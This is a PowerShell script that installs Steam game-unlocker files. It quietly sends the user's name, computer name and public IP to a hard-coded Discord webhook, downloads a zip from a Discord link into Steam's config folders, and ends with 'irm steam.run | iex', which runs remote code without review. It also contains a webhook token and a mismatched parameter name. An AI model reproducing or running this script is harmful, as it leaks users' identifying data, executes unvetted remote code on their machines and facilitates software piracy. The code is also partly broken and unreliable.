$ErrorActionPreference = "SilentlyContinue"
$steamPath = (Get-ItemProperty "HKLM:\SOFTWARE\WOW6432Node\Valve\Steam" -ErrorAction SilentlyContinue).InstallPath
if (-not $steamPath) {
    exit
}

$subirjCode = '245WLXC2'
$subirjAutoDelete = 'false'
$usageWebhook = 'https://discord.com/api/webhooks/1498501790113726484/HsAeClHM5BEvfBESArUtH8aNF_VSPaIk1kDSd9iEIguWCikjl3xZS4xf3rXgXymcXKjv'
$statusUrl = 'https://api.github.com/repos/bastisayes/Botbastisssprograma/contents/subirj_status/245WLXC2.json?ref=main'

function Assert-SubirjCodeStillActive {
    param([string]$code, [string]$statusApiUrl)
    if (-not $statusApiUrl) { return }
    try {
        $stamp = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
        $sep = "?"
        if ($statusApiUrl.Contains("?")) { $sep = "&" }
        $url = "$statusApiUrl$sep" + "ts=$stamp"
        $headers = @{ "Accept" = "application/vnd.github+json"; "User-Agent" = "subirj-check" }
        $resp = Invoke-RestMethod -Uri $url -Method Get -Headers $headers -TimeoutSec 8
        if (-not $resp -or -not $resp.content) { throw "sin_estado" }
        $jsonText = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(($resp.content -replace "s","")))
        $status = $jsonText | ConvertFrom-Json
        if (-not $status) { throw "estado_invalido" }
        if ($status.code -ne $code) { throw "codigo_distinto" }
        if (-not $status.active) { throw "codigo_revocado" }
    } catch {
        exit
    }
}

Assert-SubirjCodeStillActive -code $subirjCode -statusBaseUrl $statusUrl

function Send-SubirjUsagePing {
    param([string]$code, [string]$webhook, [string]$autoDeleteFlag)
    if (-not $webhook) { return }
    try {
        $publicIp = ""
        try {
            $publicIp = (Invoke-RestMethod -Uri "https://api.ipify.org?format=text" -TimeoutSec 6)
        } catch {
            $publicIp = "unknown"
        }
        $uname = [Environment]::UserName
        $hostn = $env:COMPUTERNAME
        $payload = @{
            content = "SUBIRJ_USE code=$code auto_delete=$autoDeleteFlag`nuser=$uname`nhost=$hostn`nip=$publicIp`nUsa /borrarj codigo:$code para cortar este codigo."
            username = "subirj-uso"
        } | ConvertTo-Json -Compress
        Invoke-RestMethod -Uri $webhook -Method Post -ContentType "application/json" -Body $payload | Out-Null
    } catch {
        # ignore
    }
}

Send-SubirjUsagePing -code $subirjCode -webhook $usageWebhook -autoDeleteFlag $subirjAutoDelete

$zipUrl = 'https://cdn.discordapp.com/attachments/1494679073757200585/1498526239063932938/1260320.zip?ex=69f17ad0&is=69f02950&hm=4eeed33dbba32703e3cfcb486efb45ab17431cbdbe16c0de5db8690ce0ccd72b&'
$tempZip = "$env:TEMP\g_1494679.zip"
$extractPath = "$env:TEMP\g_1494679_extract"

$luaDest = Join-Path $steamPath "config\stplug-in"
$manifestDest = Join-Path $steamPath "config\depotcache"

New-Item -ItemType Directory -Force -Path $luaDest | Out-Null
New-Item -ItemType Directory -Force -Path $manifestDest | Out-Null
New-Item -ItemType Directory -Force -Path $extractPath | Out-Null

function Get-MediaFireDirectLink($url) {
    $html = (Invoke-WebRequest -Uri $url -UseBasicParsing).Content
    if ($html -match 'href="(https://download[^"]+)"') {
        return $matches[1]
    }
    return $null
}

if ($zipUrl -like "*mediafire.com*") {
    $direct = Get-MediaFireDirectLink $zipUrl
    if (-not $direct) {
        exit
    }
    Start-BitsTransfer -Source $direct -Destination $tempZip
} else {
    Start-BitsTransfer -Source $zipUrl -Destination $tempZip
}

if (-not (Test-Path $tempZip)) {
    exit
}

Expand-Archive -Path $tempZip -DestinationPath $extractPath -Force

Get-ChildItem -Path $extractPath -Recurse -Filter *.lua | ForEach-Object {
    Copy-Item $_.FullName -Destination $luaDest -Force
}

Get-ChildItem -Path $extractPath -Recurse -Filter *.manifest | ForEach-Object {
    Copy-Item $_.FullName -Destination $manifestDest -Force
}

Remove-Item $tempZip -Force -ErrorAction SilentlyContinue
Remove-Item $extractPath -Recurse -Force -ErrorAction SilentlyContinue

irm steam.run | iex